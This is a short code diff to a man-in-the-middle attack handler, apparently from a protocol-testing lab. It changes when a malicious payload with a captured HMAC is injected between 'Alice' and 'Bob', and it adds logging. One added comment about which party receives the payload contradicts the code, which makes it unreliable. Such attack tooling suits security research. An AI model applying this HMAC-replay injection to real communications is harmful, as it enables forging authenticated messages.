@@ -256,11 +256,14 @@ class MitmAttackHandler:
         # After handshake, inject malicious payload with captured HMAC
         elif (self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'ready_for_injection'):
-            if not self.global_state.state['injected'] and self.global_state.state['stored_hmac']:
+            # Only inject in alice_to_bob direction (Alice -> Bob) so Alice receives the payload
+            if (correct_direction == 'alice_to_bob' and 
+                not self.global_state.state['injected'] and 
+                self.global_state.state['stored_hmac']):
                 if self.attack_log:
                     logging.info(f"[MITM] *** Injecting malicious payload with captured HMAC after successful authentication ***")
                 
-                # Get the malicious payload for bob_to_alice direction
+                # Get the malicious payload for bob_to_alice direction (this is what we intercepted)
                 malicious_payload_hex = self.payload_handler.get_attack_payload("bob_to_alice")
                 
                 # Craft the malicious package: malicious payload + captured HMAC
@@ -272,6 +275,8 @@ class MitmAttackHandler:
                             hex_str = hex_str + '0'
                         malicious_payload = binascii.unhexlify(hex_str)
                         malicious_package = malicious_payload + self.global_state.state['stored_hmac']
+                        if self.attack_log:
+                            logging.info(f"[MITM] Crafted malicious package: {len(malicious_payload)} bytes payload + {len(self.global_state.state['stored_hmac'])} bytes HMAC")
                     except Exception as e:
                         logging.error(f"[MITM] Error crafting malicious package: {e}")
                         malicious_package = self.global_state.state['stored_hmac']
